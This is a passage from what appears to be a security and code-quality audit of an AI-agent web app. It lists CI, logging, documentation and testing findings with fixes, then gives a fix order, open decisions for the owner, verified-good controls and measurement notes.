- **Where:** `pnpm format:check` fails on `apps/frontend/app/page.test.tsx`, `app/page.tsx`, `app/terms/page.tsx`, `components/app-header.tsx`, `vitest.config.mts` (they use double quotes / different formatting from the `vite.config.ts` formatter settings). `pnpm lint` has 6 warnings.
- **Fix:** Run `pnpm format` (it is `vp fmt`) and commit only formatting changes in one commit **before** other frontend fixes (so later diffs are clean). Fix the 6 lint warnings: add `void` to the floating promises (`page.tsx` lines ~111 and ~145, `useChatHistory.ts` ~147), and stringify safely in `MarkdownRenderer.tsx` (`typeof x === 'string' ? x : ''`) and `api-client.test.ts`. Then change the CI lint step to `pnpm lint --deny-warnings` if the tool supports it (check `vp lint --help`).
- **Verify:** `pnpm format:check` and `pnpm lint` exit 0 with no warnings.

### R2-OPS-03 · Medium · CI skips every DB test unless a secret is present

- **Where:** `.github/workflows/ci.yml` (`TEST_DATABASE_URL: ${{ secrets.TEST_DATABASE_URL }}`), `tests/conftest.py`.
- **Problem:** 20 tests (auth, tenancy, documents, MCP, migrations, hybrid SQL) are skipped locally and on every pull request from a fork (secrets are not passed to forks), yet the job is green. The SQL that carries the tenancy and quota guarantees is exactly what is not exercised.
- **Fix:** Use a service container so no secret is needed:

    ```yaml
    backend:
        services:
            postgres:
                image: pgvector/pgvector:pg18
                env: { POSTGRES_PASSWORD: postgres, POSTGRES_DB: nexus_test }
                ports: ['5432:5432']
                options: >-
                    --health-cmd "pg_isready -U postgres" --health-interval 5s --health-timeout 5s --health-retries 10
        steps:
            ...
            - run: uv run pytest -q
              env:
                  TEST_DATABASE_URL: postgresql://postgres:postgres@localhost:5432/nexus_test
    ```

    Add a final step `uv run pytest -q -rs | tee out.txt; ! grep -q SKIPPED out.txt` (or `--strict-markers` plus a count assertion) so a silent skip fails the job. Update the README testing section.

- **Verify:** CI log shows 0 skipped tests and ≥139 passed.

### R2-OPS-04 · Low · CI hygiene

- **Where:** `.github/workflows/ci.yml`.
- **Problem:** Actions pinned by moving tags (`@v4`, `@v5`), no `permissions:` block (default token permissions), no `concurrency` (stale runs pile up), no dependency audit, no uv cache, and the frontend job builds `@nexusagent/contracts` although nothing consumes `dist` (R2-CLN-02).
- **Fix:** Add top-level `permissions: { contents: read }` and `concurrency: { group: ci-${{ github.ref }}, cancel-in-progress: true }`. Pin each `uses:` to a full commit SHA with the tag in a comment. Add `enable-cache: true` to `setup-uv`. Remove the contracts build step. Add a job `audit`: `pnpm audit --prod --audit-level=high` and `uv run --with pip-audit pip-audit --skip-editable` (working-directory `apps/backend`, after `uv sync --frozen`). Enable Dependabot via `.github/dependabot.yml` for `npm`, `pip`/`uv` and `github-actions`, weekly.
- **Verify:** Workflow validates (`gh workflow view`/a pushed run); audit job passes after R2-SEC-08.

### R2-OPS-05 · Low · Application logging is not configured

- **Where:** `apps/backend/app/main.py` (no `logging.basicConfig`/`dictConfig`).
- **Problem:** Uvicorn configures only its own loggers. The app's `nexusagent.*` loggers inherit the root level `WARNING`, so `logger.info(...)` calls (migrations applied, pruned rows, "Applied migrations") never appear, and warnings use the bare last-resort format with no timestamp.
- **Fix:** Add `LOG_LEVEL: str = "INFO"` to `Settings`. In `main.py` call `logging.basicConfig(level=settings.LOG_LEVEL, format="%(asctime)s %(levelname)s %(name)s %(message)s")` once at import. Never log request bodies or tokens.
- **Verify:** Test with `caplog` that an `INFO` record from `nexusagent.db.migrations` is captured when the level is `INFO`.

### R2-DOC-01 · Low · Documentation drift

- `.agents/specs/features.md` line 19: "pnpm + Turborepo monorepo" is checked `[x]` but `turbo.json` was removed in the latest commit (`vite+` replaced it). Reword to "pnpm workspace + Vite+ task runner".
- `README.md` says "pnpm: `^10.x`" while `package.json` pins `pnpm@12.9.1`; `@types/node ^20` in `apps/frontend/package.json` while `engines.node >=24`. Align them (use `@types/node ^24`).
- Test file `apps/backend/tests/test_security_hitl.py` is named after the removed HITL feature but tests secret scrubbing and guardrails. Rename to `test_security_guardrails.py` (and its module docstring).
- `messages.reflection_summary` is a misnomer: it stores `{grounding, citations, mermaidDiagrams}` since the reflection step was removed. Either rename (new migration `ALTER TABLE messages RENAME COLUMN reflection_summary TO answer_meta;` plus code and contract changes) or add a comment in the schema. Optional.
- `AGENTs.md` section 2 lists itself in its own index; remove that bullet. State the actual path (`.agents/specs/AGENTs.md`) in `README.md`.
- Add to `architecture.md`: the three per-process states (R2-SEC-06), the body-size limits (R2-SEC-02), `TRUSTED_PROXY_HOPS` (R2-SEC-05), and that the MCP SSE transport follows spec `2024-11-05` (newer MCP revisions use Streamable HTTP; see **D6**).
- **Verify:** `grep -rn "Turborepo" .` finds nothing outside `node_modules`; links in README resolve.

### R2-TST-01 · Medium · Missing tests for the riskiest modules and for adversarial inputs

- **Frontend modules with no test file:** `lib/auth-store.ts` (session, logout, quota persistence), `hooks/useChatHistory.ts` (cache, delete rollback, race), `components/chat-canvas.tsx`, `composer.tsx`, `workspace-sidebar.tsx`, `observability-panel.tsx`, `app-header.tsx`, `sign-in-dialog.tsx`. Add at least: auth-store (applySession, clearSession wipes chat caches, 401 callback), useChatHistory (delete failure restores the item, out-of-order selection), composer (Enter/Shift+Enter/limit), header (quota pill, `bucketCapacity = 0`).
- **Backend:** besides the tests listed in each finding, add (a) an end-to-end test that a document uploaded by user A is invisible to user B in `/api/rag/search`, `/api/agent/stream` retrieval and `/api/documents/{id}/chunks/{chunk}` (tenancy), (b) a test that `GET /api/audit-logs`-style endpoints only return the caller's rows.
- **Verify:** `pnpm test` and `pytest` counts increase; no test is skipped in CI (R2-OPS-03).

### R2-TST-02 · Low · Deprecation warnings in the test run

- `HTTP_413_REQUEST_ENTITY_TOO_LARGE` is deprecated (used twice in `routes/documents.py`). Use `status.HTTP_413_CONTENT_TOO_LARGE`. Update tests that assert on the constant if any.
- `google.genai` emits `_UnionGenericAlias` deprecation under Python 3.14; ignore it in `pyproject.toml` with `filterwarnings = ["ignore:'_UnionGenericAlias' is deprecated:DeprecationWarning:google.genai"]` and revisit when the library is updated (R2-SEC-08 upgrades may remove it).
- **Verify:** `uv run pytest -q` prints no warnings.

---

## 7. Notes on things I deliberately did **not** list

- JWT and user data in `localStorage` (rather than HttpOnly cookies) is an accepted trade-off: the CSP is nonce-based and the token expires in 24 h and is revocable. Moving to cookies would need a BFF or same-site cookie design, which is **D7**.
- The regex scope classifier is a cost control, not a security boundary. That is documented in `AGENTs.md` already.
- `docs_url`/`openapi_url` are disabled in production; `/api/health` hides the version in production. Both are correct.

---

## 8. Recommended fix order

Do these in order, one commit each. Items in the same bullet are independent and can go in any order.

1. **Unblock CI:** R2-OPS-02 (format and lint warnings).
2. **Stop the bleeding (security, high):** R2-SEC-01, R2-SEC-02, R2-SEC-03, R2-LOG-01.
3. **Dependencies:** R2-SEC-08, then R2-OPS-04 (adds the audit job).
4. **Auth and abuse controls:** R2-SEC-04, R2-SEC-05, R2-SEC-06 (guard first; the DB option only after **D3**), R2-SEC-07 (+ R2-LOG-14 migration in a separate file).
5. **Correctness:** R2-LOG-02, R2-LOG-03, R2-LOG-04, R2-LOG-05, R2-LOG-06, R2-LOG-07, R2-LOG-08 .. R2-LOG-13.
6. **UX:** R2-UX-01, R2-UX-02, R2-UX-03, then R2-UX-04 .. R2-UX-09.
7. **Hardening leftovers:** R2-SEC-09 .. R2-SEC-12.
8. **Cleanup (after behaviour is stable):** R2-CLN-01, R2-CLN-02, R2-CLN-08, R2-CLN-09, R2-CLN-10, R2-CLN-05, R2-CLN-07, R2-CLN-04, then the larger refactors R2-CLN-03 and R2-CLN-06.
9. **Ops, docs and tests:** R2-OPS-01, R2-OPS-03, R2-OPS-05, R2-DOC-01, R2-TST-01, R2-TST-02.

---

## 9. Decisions needed from the owner (the fixer must not guess)

| ID  | Question                                                                                                                                                                                                                                                                                                 | Recommendation                                                                                                                                                                                                         |
| --- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| D1  | **Keep or drop `llama-index-core`?** It is used only for `MarkdownNodeParser` (split by headers) in `rag/parser.py`, yet it pulls a large transitive tree (Pillow, NLTK, aiohttp, dnspython, ...), which is most of the backend CVE list (R2-SEC-08). `AGENTs.md` names LlamaIndex as part of the stack. | Replace with a ~40-line header splitter you own (the parser already post-splits large sections itself). Cuts the attack surface and install size. If you keep it, accept the audit noise and pin/upgrade aggressively. |
| D2  | **Wire the refresh flow or delete it?** (R2-LOG-11)                                                                                                                                                                                                                                                      | Wire it (small change, removes the daily forced logout).                                                                                                                                                               |
| D3  | **Single instance guaranteed, or make abuse counters stateless?** (R2-SEC-06)                                                                                                                                                                                                                            | If you stay on one Render/Fly instance, do only the `WEB_CONCURRENCY` guard. Otherwise do the DB table.                                                                                                                |
| D4  | **Add a "search only this document" selector, or delete `documentId` plumbing?** The backend (`/agent/stream`, `/rag/search`) supports it; the UI never sends it.                                                                                                                                        | Delete the frontend plumbing now; keep the backend parameter until you decide.                                                                                                                                         |
| D5  | **Do you want any of the `.agents` stub files filled in?** (R2-CLN-08)                                                                                                                                                                                                                                   | No. Delete them.                                                                                                                                                                                                       |
| D6  | **MCP transport:** the SSE + `POST /messages` transport follows spec `2024-11-05`, which newer MCP revisions replace with Streamable HTTP. Do external clients (Claude Desktop, Cursor) you care about still work with it?                                                                               | Verify with the clients you target before the next release; no code change until then.                                                                                                                                 |
| D7  | **Session storage:** keep the bearer token in `localStorage`, or move to an HttpOnly same-site cookie via a Next.js route handler?                                                                                                                                                                       | Keep as is for the demo; revisit if you add paid users.                                                                                                                                                                |

---

## Appendix A. Verified-good controls (so nobody "fixes" them)

- **SQL:** all values are bound parameters. The only f-strings in `neon.py` interpolate `$n` placeholder indexes and the constant `SELECT_COLUMNS`. No injection path found.
- **Tenancy:** `require_document_access`, `delete_user_document` (`AND user_id = $2 AND is_seeded = FALSE`), `get_conversation_with_messages`, `delete_conversation`, `get_conversation_history`, `create_conversation` (`ON CONFLICT ... WHERE user_id = EXCLUDED.user_id`) and the audit-log reader all filter by the caller. MCP search passes no `user_id`, so it only searches seeded documents.
- **Auth:** Google ID tokens are verified locally (RS256, audience, issuer, `exp`/`iat`/`sub` required, `email_verified`). Accounts are keyed on `sub`. JWTs carry `iss`/`aud`, and logout bumps `token_version`.
- **Quota:** `consume_rate_limit` is one atomic statement; out-of-scope refusals are free; the stream endpoint validates input before charging.
- **Prompt-injection controls:** untrusted-context delimiters with escaping, canary hold-back streaming (a leaked canary never reaches the client), secret scrubbing of documents and chunks, injection warnings surfaced to the UI.
- **Frontend:** per-request CSP nonce in `proxy.ts`, no script `unsafe-inline`, Mermaid `securityLevel: 'strict'` plus DOMPurify before `dangerouslySetInnerHTML`, links restricted to `http(s)`, chat caches wiped on logout, no real secrets in 87 commits.
- **Database:** append-only audit trigger with a transaction-local retention switch; `statement_cache_size=0` for the Neon pooler; migrations under an advisory lock.

## Appendix B. How the key claims were measured

- **ReDoS (R2-SEC-01):** imported `security_guardrails.py` in isolation and timed `scrub_sensitive_information` on 20/40/80 KB repeated adversarial strings (JWT 0.08/0.30/1.21 s, DB URI 0.68/2.54 s at 40/80 KB, private key 0.21/0.89 s). Growth ≈ 4x per doubling = quadratic. Candidate fixes were timed on 1 MB inputs (0.004 to 0.23 s).
- **Body parsed before auth (R2-SEC-02):** a minimal FastAPI app with an `UploadFile` plus a failing auth dependency, `MultiPartParser.parse` monkeypatched to record order: result `401` with order `['body-parsed', 'auth']`.
- **Dependencies (R2-SEC-08):** `pnpm audit --prod` (38 findings) and `pip-audit --skip-editable` against `apps/backend/.venv`.
- **Gates:** `uv run pytest -q` (119 passed, 20 skipped), `ruff check`, `ruff format --check`, `tsc --noEmit`, `vp lint`, `vp fmt --check`.
